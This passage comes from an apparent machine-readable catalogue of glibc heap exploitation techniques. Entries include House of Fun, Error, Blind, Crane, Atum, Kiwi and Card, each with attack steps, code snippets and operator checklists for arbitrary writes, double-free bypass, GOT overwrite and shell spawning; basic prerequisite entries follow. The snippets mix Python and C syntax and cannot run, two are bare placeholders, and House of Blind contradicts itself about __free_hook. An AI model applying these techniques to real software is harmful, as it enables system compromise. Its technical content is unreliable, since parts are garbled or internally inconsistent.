      summary: 'Same base requirements as tcache stashing unlink, but the trigger mechanism differs. Requires understanding of when malloc internally triggers the bin stash operation versus when calloc is used.',
      required: [
        'calloc() is used (NOT malloc — malloc goes to tcache first, bypassing the stash path)',
        'Glibc 2.26-2.31 (tcache with stashing in calloc)',
        'Ability to corrupt the bk pointer of a smallbin chunk',
        'tcache for the target size must have at least 1 free slot but less than TCACHE_FILL_COUNT (7)',
        'Smallbin must have at least 2 chunks (the target + one valid chunk for the forward list)'
      ],
      detectionSteps: [
        'Run: objdump -d ./binary | grep calloc → verify calloc usage',
        'Check libc version: strings libc.so | grep "GNU C Library"',
        'In GDB: inspect smallbin via pwndbg "bins" command after freeing chunks',
        'Verify tcache count for the target size is between 1 and 6',
        'Identify the specific trigger: is it calloc-based or malloc+consolidate-based?'
      ]
    },

    exploitationPaths: [
      {
        name: 'House of Fun: malloc + Internal Stash Trigger',
        description: 'The variant trigger: when malloc finds a smallbin chunk but tcache is not full, it may still stash remaining chunks. Exploit this to trigger the bk write via malloc instead of calloc.',
        steps: [
          'Setup: allocate and free enough chunks to populate a smallbin and leave tcache with 1-3 slots remaining',
          'Corrupt the bk pointer of the last chunk in the smallbin to point to target_addr - 0x10',
          'Now call malloc() — malloc sees tcache has space, retrieves from smallbin, then stashes remaining chunks',
          'During the stash operation, the corrupted bk is followed — smallbin->bk->fd = smallbin (the unlink write)',
          'Result: target_addr now contains a heap/libc pointer',
          'This differs from classic tcache stashing which is exclusively calloc-triggered'
        ],
        tools: ['pwndbg bins', 'pwntools'],
        codeSnippet: `# House of Fun: variant trigger
# Setup: fill tcache partially (leave room)
for i in range(6):  # only 6, leave 1 slot
    p = malloc(0x100)
    free(p)

# Create smallbin chunks
a = malloc(0x100)
b = malloc(0x100)
free(a)  # to unsorted bin
free(b)  # to large bin or smallbin consolidation

# Alternative: specific malloc sequence that triggers stash in malloc (not calloc)
# The key is: malloc may internally stash when it finds smallbin chunks

# Corrupt last smallbin chunk's bk:
*(uint64_t*)(smallbin_tail + 0x18) = target_addr - 0x10

# Trigger via malloc (variant trigger path, not calloc)
# This works in specific malloc sequences where stash is called
p = malloc(0x100)  # if stash is triggered here → arbitrary write`,
        applicableLibc: '2.26-2.31',
        references: [
          { description: 'How2Heap: house_of_fun.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_fun.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['Arbitrary address overwritten via stash unlink', 'Can be chained with second-stage exploitation'],
      artifacts: ['GDB: smallbin with corrupted bk chain visible', 'target_addr contains heap/libc pointer']
    },

    operatorChecklist: [
      '[ ] Verify glibc version is 2.26-2.31 for tcache stashing',
      '[ ] Identify the specific trigger: malloc vs calloc based on code analysis',
      '[ ] Set up heap: free chunks into smallbin, leave tcache with 1-4 slots remaining',
      '[ ] Identify smallbin layout via pwndbg bins',
      '[ ] Corrupt the bk pointer of a smallbin chunk via UAF or heap overflow',
      '[ ] Choose target: _IO_list_all, __free_hook, or any writable global',
      '[ ] Trigger via the correct allocator function (malloc variant path)',
      '[ ] Verify the write occurred via GDB inspection',
      '[ ] Chain with FSOP or other second-stage technique for code execution'
    ],

    vulnerabilityTypes: ['heap', 'tcache', 'stashing', 'variant-trigger'],
    references: [
      { description: 'How2Heap: house_of_fun.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_fun.c' }
    ]
  },

  house_of_error: {
    id: 'house_of_error',
    name: 'House of Error (Arbitrary Address Free via Tcache Key Manipulation)',
    category: 'technique',
    class: 'house',
    description: 'Exploits tcache key checking mechanism to trigger an arbitrary address free. The tcache uses a key field per chunk (for detecting double-frees) and the count/entry fields in the tcache_perthread_struct. By manipulating these, an attacker can cause free() to target an arbitrary address, leading to heap metadata corruption that can be chained into arbitrary write primitives.',

    preconditions: {
      summary: 'A write primitive that can reach the tcache_perthread_struct entries or the key field of tcache chunks. By setting tcache entries to point to an arbitrary address and manipulating counts, free() can be made to operate on arbitrary memory.',
      required: [
        'Arbitrary write or UAF allowing modification of tcache_perthread_struct',
        'Ability to set entries[size_index] to an arbitrary target address',
        'Ability to set counts[size_index] to a non-zero value',
        'Glibc 2.26-2.31 (before tcache key hardening)'
      ],
      detectionSteps: [
        'Locate tcache_perthread_struct at heap_base + 0x10',
        'Identify size_index = target_size >> 4',
        'Verify entries[size_index] and counts[size_index] are writable via overflow or UAF',
        'Determine the arbitrary address to be "freed"',
        'In GDB: verify the key field in tcache chunks is not checked or can be bypassed'
      ]
    },

    exploitationPaths: [
      {
        name: 'Tcache Key Bypass → Arbitrary Address Free',
        description: 'Corrupt tcache_perthread_struct to make free() operate on an arbitrary target address, corrupting the target\'s metadata.',
        steps: [
          'Locate tcache_perthread_struct at heap_base + 0x10',
          'Calculate size_index = target_size >> 4',
          'Set entries[size_index] = target_addr - 0x10 (fake chunk header address)',
          'Set counts[size_index] = 1 (mark bin as having one entry)',
          'The fake chunk at target_addr - 0x10 needs a valid size field',
          'Forge fake chunk at target_addr with appropriate size field',
          'Call free(target_addr) — the tcache handling will link the fake chunk incorrectly',
          'Result: arbitrary address gets "freed" into tcache metadata, corrupting its contents',
          'Next malloc of this size returns the corrupted region — arbitrary write achieved'
        ],
        tools: ['pwndbg heap', 'pwntools'],
        codeSnippet: `# House of Error: arbitrary address free via tcache key manipulation
tcache_struct = heap_base + 0x10
size_index = target_size >> 4

# Point tcache entry to our target (as if it's a freed chunk)
*(uint64_t*)(tcache_struct + 0x40 + size_index * 8) = target_addr - 0x10

# Set count to 1 (tcache thinks it has 1 chunk)
*(uint8_t*)(tcache_struct + size_index) = 1

# Forge a fake chunk at target_addr
# (needs to look like a valid tcache chunk to pass initial checks)
*(uint64_t*)(target_addr) = 0  # prev_size
*(uint64_t*)(target_addr + 0x8) = target_size | 0x1  # size + PREV_INUSE

# Now when we call free(target_addr), tcache will:
# - Look up entries[size_index] → target_addr - 0x10
# - Set key on the chunk at target_addr
# - This corrupts arbitrary memory via tcache key write`,
        applicableLibc: '2.26-2.31 (key field checks vary)',
        references: [
          { description: 'How2Heap: house_of_error.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_error.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['free() operated on arbitrary address', 'Target memory corrupted via tcache metadata write'],
      artifacts: ['GDB: tcache_perthread_struct entries corrupted', 'Arbitrary address shows tcache metadata']
    },

    operatorChecklist: [
      '[ ] Locate tcache_perthread_struct (heap_base + 0x10)',
      '[ ] Calculate size_index for target allocation size',
      '[ ] Overwrite entries[size_index] = target_addr - 0x10',
      '[ ] Set counts[size_index] = 1',
      '[ ] Forge valid fake chunk at target_addr with size field',
      '[ ] Call free(target_addr) — triggers arbitrary address free',
      '[ ] Observe corruption at target address via GDB',
      '[ ] Chain with tcache poisoning or second-stage technique'
    ],

    vulnerabilityTypes: ['heap', 'tcache', 'arbitrary-free'],
    references: [
      { description: 'How2Heap: house_of_error.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_error.c' }
    ]
  },

  house_of_blind: {
    id: 'house_of_blind',
    name: 'House of Blind (Blind __free_hook Replacement)',
    category: 'technique',
    class: 'house',
    description: 'A leakless technique for modern glibc (2.34+) that replaces __free_hook without needing to know the libc base address. Since glibc 2.34 removed __malloc_hook and __free_hook, this targets other hook-like pointers or uses alternative paths in the newer glibc to achieve arbitrary code execution without any info leak.',

    preconditions: {
      summary: 'No libc leak required. Targets alternative hook mechanisms in glibc 2.34+ where hooks were removed. Uses partial overwrite or brute-force techniques to redirect free() execution.',
      required: [
        'Heap overflow or UAF on a tcache-sized chunk',
        'No libc leak available (this is the leakless appeal)',
        'Glibc 2.34+ (hooks removed era)',
        'Ability to corrupt tcache fd/bk pointers or metadata'
      ],
      detectionSteps: [
        'Verify glibc version is 2.34+ (hooks removed)',
        'Identify alternative targets: exit function pointers, tlsdtor_list, or other global function pointers',
        'In GDB: find pointers accessible from heap that can be corrupted',
        'Determine if partial overwrite (1-2 bytes) is possible for brute-force'
      ]
    },

    exploitationPaths: [
      {
        name: 'Blind Hook Replacement (No Leak)',
        description: 'Replace a hook-like function pointer blindly using partial overwrites or tcache poisoning, achieving code execution without libc base knowledge.',
        steps: [
          'Since __free_hook is removed in 2.34+, target alternative pointers:',
          'Option A: _IO_2_1_stderr_\'s _wide_data vtable pointer (can be partially overwritten)',
          'Option B: tlsdtor_list pointer (thread local destructor list)',
          'Option C: Reuse tcache poisoning to overwrite an adjacent function pointer',
          'If using partial overwrite: only overwrite the last 2-3 bytes (1/4096 or 1/65536 chance)',
          'The overwrite destination should point to a known region (e.g., heap or BSS) where one_gadget can be placed',
          'Pre-place shellcode/one_gadget at predictable address on heap',
          'Trigger free() on any chunk — execution redirects to overwritten pointer',
          'Shell obtained without any leak'
        ],
        tools: ['pwndbg', 'pwntools', 'one_gadget'],
        codeSnippet: `# House of Blind: leakless __free_hook replacement (glibc 2.34+)
# Since __free_hook is gone, target alternative pointers

# Option A: Partial overwrite of stderr's vtable pointer (low entropy)
# Leak nothing - just overflow and partially overwrite
# Suppose stderr._wide_vtable is at a known heap-adjacent offset

# Option B: Use tcache to place one_gadget at predictable heap address
# and corrupt an adjacent pointer to point there
p1 = malloc(0x60)
p2 = malloc(0x60)
free(p1)  # tcache

# Overwrite p1's fd to point to a controlled heap location with one_gadget
# The heap location must look like a valid chunk
controlled_addr = heap_base + 0x12340
*(uint64_t*)(controlled_addr + 0x10) = one_gadget  # place gadget
*(uint64_t*)(controlled_addr + 0x8) = 0x71  # size field

# Corrupt tcache fd
*(uint64_t*)(p1) = controlled_addr  # tcache fd = controlled_addr

# Trigger: next malloc returns controlled_addr with one_gadget
# But we need to actually redirect free():
# Instead, corrupt a function pointer that free() will call
# ... (alternative paths depend on specific binary)
`,
        applicableLibc: '2.34+',
        references: [
          { description: 'How2Heap: house_of_blind.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_blind.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['Hook-like pointer replaced without leak', 'free() redirects to controlled code', 'Shell obtained'],
      artifacts: ['GDB: corrupted function pointer visible', 'No libc leak needed']
    },

    operatorChecklist: [
      '[ ] Verify glibc 2.34+ (hooks removed)',
      '[ ] Identify alternative target: exit hooks, tlsdtor, or function pointers in reachable memory',
      '[ ] Determine if partial overwrite (low entropy) or full corruption is possible',
      '[ ] Place one_gadget or ROP chain at predictable address',
      '[ ] Corrupt target pointer to point to our code',
      '[ ] Trigger free() to redirect execution',
      '[ ] Verify: shell spawned without any libc/heap leak'
    ],

    vulnerabilityTypes: ['heap', 'tcache', 'leakless', 'modern-glibc'],
    references: [
      { description: 'How2Heap: house_of_blind.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_blind.c' }
    ]
  },

  house_of_crane: {
    id: 'house_of_crane',
    name: 'House of Crane (Non-Adjacent Malloc Consolidation)',
    category: 'technique',
    class: 'house',
    description: 'Exploits malloc_consolidate behavior to trigger non-adjacent chunk merging for overlapping allocations. By corrupting the prev_size of a freed chunk, malloc_consolidate can be tricked into merging chunks that are NOT physically adjacent in memory, creating overlapping allocations that span non-contiguous regions.',

    preconditions: {
      summary: 'A heap overflow or UAF that can corrupt the prev_size field of a freed chunk. The key insight is that malloc_consolidate checks prev_size to determine merge targets, and this can be exploited even when chunks are not adjacent.',
      required: [
        'Heap overflow or UAF to write to prev_size of a freed chunk',
        'Ability to trigger malloc_consolidate (via large malloc or free of large chunk)',
        'Understanding of prev_size-based consolidation logic',
        'Control over chunk layout to set up the non-adjacent merge scenario'
      ],
      detectionSteps: [
        'In GDB: allocate and free a chunk to observe prev_size behavior',
        'Overflow to corrupt the prev_size of a freed chunk to a larger value',
        'Trigger malloc_consolidate via large malloc',
        'Observe in pwndbg that consolidation merges non-adjacent chunks'
      ]
    },

    exploitationPaths: [
      {
        name: 'Non-Adjacent Consolidation → Overlapping Allocations',
        description: 'Corrupt prev_size of a freed chunk to trick malloc_consolidate into merging with a non-adjacent chunk, creating overlapping memory regions.',
        steps: [
          'Allocate chunks A, B, C in sequence (adjacent in memory)',
          'Free chunk B — it goes to unsorted bin',
          'Overflow from A to corrupt B\'s prev_size field to a large value (e.g., distance from B to C)',
          'Forge a fake chunk header within B\'s data area at the prev_size offset',
          'Trigger malloc_consolidate by freeing C or allocating a large chunk',
          'malloc_consolidate sees prev_size indicating backward merge target is far away',
          'B merges backward to the forged chunk location, creating overlap between non-adjacent regions',
          'Now allocate from the overlapping region to get two pointers to overlapping memory',
          'Use for arbitrary read/write through the overlap'
        ],
        tools: ['pwndbg heap', 'pwntools'],
        codeSnippet: `House of Crane snippet`,
        applicableLibc: 'All versions (mechanism varies)',
        references: [
          { description: 'How2Heap: house_of_crane.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_crane.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['Non-adjacent chunks merged via malloc_consolidate', 'Overlapping allocations created'],
      artifacts: ['GDB: heap chunks showing non-adjacent consolidation']
    },

    operatorChecklist: [
      '[ ] Allocate chunk sequence A, B, C',
      '[ ] Free chunk B to place in unsorted bin',
      '[ ] Overflow to corrupt B\'s prev_size field to a large non-adjacent value',
      '[ ] Forge fake chunk metadata to receive the backward consolidation',
      '[ ] Trigger malloc_consolidate via free(C) or large malloc',
      '[ ] Observe non-adjacent merge in GDB',
      '[ ] Allocate to get overlapping chunks',
      '[ ] Use overlap for arbitrary read/write'
    ],

    vulnerabilityTypes: ['heap', 'malloc-consolidate', 'overlapping'],
    references: [
      { description: 'How2Heap: house_of_crane.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_crane.c' }
    ]
  },

  house_of_atum: {
    id: 'house_of_atum',
    name: 'House of Atum (Fastbin Reverse + Tcache Stashing Combo)',
    category: 'technique',
    class: 'house',
    description: 'Combines fastbin reverse attack with tcache stashing unlink in a single exploit chain. The fastbin reverse is used to get a write-what-where primitive, which is then immediately used to set up the tcache stashing unlink for a second arbitrary write. This combo bypasses modern glibc mitigations that would block either technique alone.',

    preconditions: {
      summary: 'Both fastbin reverse and tcache stashing require specific glibc versions and chunk layouts. House of Atum chains them together: the first stage provides the arbitrary write for the second stage.',
      required: [
        'Heap overflow or UAF enabling fastbin attack',
        'Glibc 2.26-2.31 (tcache era with stashing)',
        'Fastbin-sized allocation capability (0x20-0x80)',
        'Ability to chain: fastbin reverse provides write → tcache stashing uses it'
      ],
      detectionSteps: [
        'Verify glibc version is 2.26-2.31',
        'Identify fastbin-sized overflow or UAF',
        'Determine if tcache stashing trigger (calloc) is reachable',
        'Plan two-stage: fastbin reverse writes target for tcache stashing'
      ]
    },

    exploitationPaths: [
      {
        name: 'Fastbin Reverse + Tcache Stashing Two-Stage Exploit',
        description: 'Stage 1: Use fastbin reverse to write a heap pointer to a strategic location. Stage 2: Use that write to set up tcache stashing for a second arbitrary write.',
        steps: [
          'Stage 1 — Fastbin Reverse Attack:',
          'Allocate chunks A, B where A is the fastbin victim',
          'Free A to fastbin',
          'Overflow B to corrupt A\'s fd pointer to target_addr - 0x10',
          'Allocate from fastbin: malloc returns target_addr (arbitrary write location)',
          'Write a libc pointer value here (the "what" of the write)',
          '',
          'Stage 2 — Tcache Stashing Setup:',
          'The fastbin reverse write is used to corrupt tcache_perthread_struct or smallbin bk',
          'Set up: fill tcache partially (6 entries), create smallbin with corrupted bk',
          'The fastbin reverse write corrupts smallbin chunk bk to point to strategic address',
          'Call calloc() to trigger tcache stashing unlink',
          'Result: arbitrary address written with the value from stage 1',
          'Final target: __free_hook, _IO_list_all, or similar'
        ],
        tools: ['pwndbg bins', 'pwntools', 'one_gadget'],
        codeSnippet: `House of Atum snippet`,
        applicableLibc: '2.26-2.31',
        references: [
          { description: 'How2Heap: house_of_atum.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_atum.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['Fastbin reverse stage completed', 'Tcache stashing write achieved'],
      artifacts: ['GDB: fastbin with corrupted fd', 'tcache stashing write visible']
    },

    operatorChecklist: [
      '[ ] Verify glibc 2.26-2.31',
      '[ ] Stage 1: Set up fastbin with corrupted fd',
      '[ ] Trigger fastbin reverse: malloc returns target_addr',
      '[ ] At target_addr, write value needed for stage 2',
      '[ ] Stage 2: Fill tcache partially (6 entries)',
      '[ ] Create smallbin with corrupted bk (using stage 1 write)',
      '[ ] Trigger calloc to invoke tcache stashing unlink',
      '[ ] Verify second arbitrary write occurred',
      '[ ] Chain to code execution (overwrite hook/FSOP target)'
    ],

    vulnerabilityTypes: ['heap', 'fastbin', 'tcache', 'combo'],
    references: [
      { description: 'How2Heap: house_of_atum.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_atum.c' }
    ]
  },

  house_of_kiwi: {
    id: 'house_of_kiwi',
    name: 'House of Kiwi (Small Bin Corruption + Tcache)',
    category: 'technique',
    class: 'house',
    description: 'Variant of small bin corruption targeting tcache instead of the classic smallbin bk path. House of Kiwi corrupts a smallbin chunk and uses tcache mechanisms (instead of calloc stashing) to trigger the unlink and achieve arbitrary write. The key difference from House of Fun is the specific corruption target and trigger path through tcache rather than classic smallbin unlink.',

    preconditions: {
      summary: 'Small bin-sized heap overflow or UAF combined with tcache manipulation. Similar to House of Fun but with a different corruption target and trigger mechanism through tcache entry manipulation.',
      required: [
        'Heap overflow or UAF on smallbin-sized chunk',
        'Ability to corrupt smallbin chunk fd/bk pointers',
        'Glibc 2.26-2.31 (tcache era)',
        'Ability to manipulate tcache entries to receive the corrupted chunk'
      ],
      detectionSteps: [
        'Verify glibc 2.26-2.31',
        'Identify smallbin-sized overflow or UAF (chunks 0x80-0x400)',
        'Check tcache state: need partially filled tcache for the target size',
        'Plan corruption: smallbin fd/bk → tcache entry manipulation path'
      ]
    },

    exploitationPaths: [
      {
        name: 'Small Bin Corruption → Tcache Entry Poisoning',
        description: 'Corrupt smallbin chunk metadata and use tcache manipulation to trigger the unlink for arbitrary write.',
        steps: [
          'Allocate chunks A (target smallbin), B (guard)',
          'Free A to place in smallbin (or unsorted then smallbin after malloc)',
          'Free B to tcache if small enough',
          'Corrupt A\'s fd or bk pointer via overflow from B or UAF',
          'The corruption points to an arbitrary target address (target_addr)',
          'Set up tcache entries to "receive" the corrupted smallbin chunk',
          'Manipulate counts so the tcache bin appears to have space',
          'Trigger via malloc (not calloc — different from House of Fun)',
          'malloc walks the smallbin and tcache, causing corrupted bk write to target',
          'Result: arbitrary write of a heap/libc pointer to target_addr'
        ],
        tools: ['pwndbg bins', 'pwntools'],
        codeSnippet: `# House of Kiwi: small bin corruption + tcache
# Setup smallbin chunk
a = malloc(0x100)  # smallbin size
free(a)  # a → smallbin (or unsorted → smallbin)

# Setup tcache for same size
for i in range(5):
    p = malloc(0x100)
    free(p)  # tcache[0x110] has 5 entries

# Corrupt a's bk pointer to point to target
*(uint64_t*)(a + 0x18) = target_addr - 0x10

# Tcache manipulation: set up to trigger write during malloc
# The malloc path may check smallbin before tcache
# When malloc sees smallbin chunk, it may stash remaining chunks
tcache_struct = heap_base + 0x10
# Make tcache ready to receive (set count appropriately)

# Trigger: malloc looks at smallbin, finds corrupted chunk
# Unlink proceeds → target_addr gets written with smallbin head pointer
p = malloc(0x100)  # triggers smallbin unlink with corrupted bk`,
        applicableLibc: '2.26-2.31',
        references: [
          { description: 'How2Heap: house_of_kiwi.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_kiwi.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['Smallbin unlink write to arbitrary address', 'target_addr corrupted with heap pointer'],
      artifacts: ['GDB: smallbin with corrupted bk', 'target_addr shows write']
    },

    operatorChecklist: [
      '[ ] Verify glibc 2.26-2.31',
      '[ ] Set up smallbin: allocate and free smallbin-sized chunk',
      '[ ] Set up tcache: partially fill tcache for same size class',
      '[ ] Corrupt smallbin chunk bk pointer to target_addr - 0x10 via overflow/UAF',
      '[ ] Manipulate tcache count/entries to prepare for stash',
      '[ ] Trigger via malloc (not calloc — distinct from House of Fun)',
      '[ ] Verify arbitrary write to target_addr',
      '[ ] Chain with second-stage technique'
    ],

    vulnerabilityTypes: ['heap', 'smallbin', 'tcache', 'variant'],
    references: [
      { description: 'How2Heap: house_of_kiwi.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_kiwi.c' }
    ]
  },

  house_of_card: {
    id: 'house_of_card',
    name: 'House of Card (Double Free via Tcache Key Bypass)',
    category: 'technique',
    class: 'house',
    description: 'Exploits tcache double-free detection bypass to achieve double-free on the same chunk. The tcache stores a "key" pointer in freed chunks to detect double-frees. House of Card bypasses this by overwriting the key field, allowing the same chunk to be freed twice to tcache, enabling classic double-free exploitation (tcache poisoning/duplicate).',

    preconditions: {
      summary: 'A write primitive that can overwrite the key field of a tcache chunk. By clearing or redirecting the key, the double-free check is bypassed, allowing the same chunk to be returned by malloc twice.',
      required: [
        'UAF or write primitive that can reach the key field of a tcache chunk',
        'The key field is at offset 0x8 in tcache chunks (for 64-bit): tcache_entry->key = pointer to tcache_perthread_struct',
        'Glibc 2.26-2.31 (tcache key era — later versions may have additional checks)',
        'Ability to first free a chunk, then overwrite its key, then free again'
      ],
      detectionSteps: [
        'Allocate a tcache-sized chunk',
        'Free it: observe key field at chunk+0x8 is set to tcache_perthread_struct',
        'Use UAF/write to overwrite the key field to NULL or another value',
        'Free the same chunk again: if key was overwritten, double-free check is bypassed',
        'In GDB: verify chunk appears in tcache twice after second free'
      ]
    },

    exploitationPaths: [
      {
        name: 'Tcache Key Overwrite → Double Free Enabled',
        description: 'Overwrite tcache chunk key field to bypass double-free detection, enabling tcache poisoning via double-free.',
        steps: [
          'Allocate chunk A (tcache size, e.g., 0x70)',
          'Free A: A goes to tcache, key field at A+0x8 is set to tcache_perthread_struct',
          'Use UAF or overflow to overwrite A\'s key field at offset 0x8',
          'Set key to NULL or any value != tcache_perthread_struct',
          'Now free A again: tcache checks key == tcache_perthread_struct? NO (overwritten)',
          'Double-free is NOT detected! A is added to tcache again',
          'tcache now has A listed twice (or A points to itself)',
          'Allocate twice: malloc returns A twice — two pointers to same memory',
          'Use the double allocation for tcache poisoning: overwrite A\'s fd to point to target',
          'Third malloc returns target — arbitrary allocation achieved'
        ],
        tools: ['pwndbg heap', 'pwntools'],
        codeSnippet: `# House of Card: double free via tcache key bypass
p = malloc(0x70)  # tcache size
free(p)  # p → tcache, p->key = tcache_perthread_struct

# UAF/overflow to overwrite p's key field
# key is at offset 0x8 in the tcache chunk header
*(uint64_t*)(p + 0x8) = 0  # set key to NULL

# Now free again — tcache double-free check is bypassed!
free(p)  # p → tcache again! No detection!

# tcache now has p twice (circular: p->next = p)
# Allocate twice to get p twice
a1 = malloc(0x70)  # a1 == p
a2 = malloc(0x70)  # a2 == p (same as a1!)

# Now we have two pointers to the same chunk
# Use for tcache poisoning:
# Overwrite via a1
*(uint64_t*)(a1) = target_addr - 0x10  # fd pointer

# Next allocation returns target_addr
a3 = malloc(0x70)  # a3 == target_addr!`,
        applicableLibc: '2.26-2.31',
        references: [
          { description: 'How2Heap: house_of_card.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_card.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['Double-free bypassed via key overwrite', 'Same chunk returned twice by malloc', 'Tcache poisoning via double allocation achieved'],
      artifacts: ['GDB: tcache shows same chunk twice', 'Arbitrary allocation via fd corruption']
    },

    operatorChecklist: [
      '[ ] Allocate tcache-sized chunk A',
      '[ ] Free A to tcache (key field set to tcache_perthread_struct)',
      '[ ] Overwrite A\'s key field at offset 0x8 to NULL or other value',
      '[ ] Free A again — double-free bypass confirmed in GDB',
      '[ ] Allocate twice: get the same chunk twice',
      '[ ] Use double-pointer to corrupt fd for tcache poisoning',
      '[ ] Allocate third time: arbitrary address returned',
      '[ ] Chain to code execution (hook overwrite, FSOP, etc.)'
    ],

    vulnerabilityTypes: ['heap', 'tcache', 'double-free', 'key-bypass'],
    references: [
      { description: 'How2Heap: house_of_card.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_card.c' }
    ]
  },

  // ============== PREREQUISITES ==============

  memory_layout: {
    id: 'memory_layout',
    name: 'Memory Layout',
    category: 'leaf',
    class: 'Prerequisite',
    description: 'Understanding of Process Memory Map: Text, Data, BSS, Heap, and Stack segments.',
    preconditions: {
      summary: 'Basic understanding of how a process is loaded into memory.',
      required: ['Linux system', 'Compiled binary'],
      detectionSteps: ['Run `cat /proc/<pid>/maps` while binary is running to see segments'],
    },
    exploitationPaths: [
      {
        name: 'Analyzing Memory Map',
        description: 'Using tools to examine memory layout.',
        steps: [
          'Run the binary under GDB',
          'Use `vmmap` or `info proc mappings` to view the memory segments',
          'Identify the permissions of each segment (rwx)',
        ],
        tools: ['GDB', 'pwndbg', 'cat /proc/<pid>/maps'],
      }
    ],
    postconditions: {
      successIndicators: ['Identified readable, writable, executable regions.'],
      artifacts: ['Memory map layout notes'],
    },
    operatorChecklist: [
      '[ ] Run checksec to list all protections (NX, PIE, canary, RELRO)',
      '[ ] Identify stack, heap, libc, and binary base address ranges',
      '[ ] Check for executable stack (NX disabled) and executable heap',
      '[ ] Find PIE/non-PIE base address for ASLR bypass',
      '[ ] Map writable sections (.data, .bss, .got) for write targets',
      '[ ] Use vmmap in pwndbg to verify runtime memory permissions',
    ],
    vulnerabilityTypes: ['General'],
    references: []
  },

  calling_conventions: {
    id: 'calling_conventions',
    name: 'Calling Conventions',
    category: 'leaf',
    class: 'Prerequisite',
    description: 'How arguments are passed to functions (e.g., x64 Linux: rdi, rsi, rdx, rcx, r8, r9).',
    preconditions: {
      summary: 'Knowledge of assembly and how functions receive data.',
      required: ['Target architecture (x86_64, x86, ARM, etc.)'],
      detectionSteps: [],
    },
    exploitationPaths: [
      {
        name: 'Setting up arguments',
        description: 'Using gadgets to set registers before a function call.',
        steps: [
          'Find ROP gadgets (e.g., `pop rdi; ret`)',
          'Place the argument value on the stack',
          'Execute the gadget to pop the value into the correct register',
          'Call the target function',
        ],
        tools: ['Ropper', 'ROPgadget', 'pwntools'],
      }
    ],
    postconditions: {
      successIndicators: ['Function successfully called with controlled arguments.'],
      artifacts: ['ROP chain payload'],
    },
    operatorChecklist: [
      '[ ] Identify target architecture (x86_64, x86, ARM, AArch64)',
      '[ ] Verify correct register order for calling convention (e.g., rdi, rsi, rdx, rcx, r8, r9 for x86_64 System V)',
      '[ ] Ensure stack alignment (16-byte for x86_64 before call instruction)',
      '[ ] Find "pop rdi; ret" and other register-setting gadgets with ROPgadget/ropper',
      '[ ] Verify argument passing for syscall convention (rax=syscall#, rdi=arg1, etc.)',
    ],
    vulnerabilityTypes: ['General'],
    references: []
  },

  elf_format: {
    id: 'elf_format',
    name: 'ELF File Format',
    category: 'leaf',
    class: 'Prerequisite',
    description: 'Executable and Linkable Format: Sections, Segments, Program Headers.',
    preconditions: {
      summary: 'Understanding of the ELF binary structure.',
      required: ['ELF binary'],
      detectionSteps: ['Use `readelf -a <binary>` to inspect'],
    },
    exploitationPaths: [
      {
        name: 'Parsing ELF',
        description: 'Extracting useful information from the ELF file.',
        steps: [
          'Identify sections like `.text`, `.data`, `.bss`, `.plt`, `.got`',
          'Find the entry point address',
          'Check for dynamically linked libraries',
        ],
        tools: ['readelf', 'objdump', 'pwntools (ELF class)'],
      }
    ],
    postconditions: {
      successIndicators: ['Found addresses of important sections or functions.'],
      artifacts: ['ELF analysis report'],
    },
    operatorChecklist: [
      '[ ] Check dynamically linked vs statically linked with `file ./binary`',
      '[ ] Find GOT/PLT addresses: readelf -r ./binary | grep GOT',
      '[ ] Check RELRO level: readelf -d ./binary | grep BIND_NOW',
      '[ ] Locate .bss and writable sections for data placement',
      '[ ] Find entry point and main: readelf -h ./binary; objdump -d ./binary | grep "<main>"',
      '[ ] Identify symbols: nm ./binary | grep -i "func\\|win\\|shell"',
    ],
    vulnerabilityTypes: ['General'],
    references: []
  },

  plt_got: {
    id: 'plt_got',
    name: 'PLT / GOT',
    category: 'leaf',
    class: 'Prerequisite',
    description: 'Procedure Linkage Table and Global Offset Table mechanisms for dynamic linking.',
    preconditions: {
      summary: 'Understanding of lazy binding in dynamically linked ELFs.',
      required: ['Dynamically linked ELF binary'],
      detectionSteps: ['Use `objdump -R <binary>` to see GOT entries'],
    },
    exploitationPaths: [
      {
        name: 'GOT Overwrite',
        description: 'Overwriting a GOT entry to redirect execution.',
        steps: [
          'Identify the GOT address of a target function (e.g., `puts`)',
          'Find a primitive (e.g., format string, arbitrary write) to write to this address',
          'Write the address of another function (e.g., `system`) or a one_gadget to the GOT entry',
          'Trigger the original function to execute the new code',
        ],
        tools: ['objdump', 'pwntools', 'GDB'],
      }
    ],
    postconditions: {
      successIndicators: ['Execution redirected when target function is called.'],
      artifacts: ['Payload with GOT overwrite'],
    },
    operatorChecklist: [
      '[ ] Verify RELRO status with checksec (Partial/No RELRO required for GOT overwrite)',
      '[ ] Find target GOT entry address: readelf -r ./binary | grep puts',
      '[ ] Find replacement function address in libc',
      '[ ] Build write payload (format string %n or heap arbitrary write)',
      '[ ] Confirm the target function is called after overwrite',
      '[ ] If Full RELRO: target __malloc_hook, __free_hook, or FSOP instead',
    ],
    vulnerabilityTypes: ['General'],
    references: []
  },

  glibc_malloc: {
    id: 'glibc_malloc',
    name: 'Glibc Malloc Internals',
    category: 'leaf',
    class: 'Prerequisite',
    description: 'Understanding chunks, arenas, bins (fast, unsorted, small, large), and tcache.',
    preconditions: {
      summary: 'Understanding of glibc heap memory management.',
      required: ['Binary using glibc malloc'],
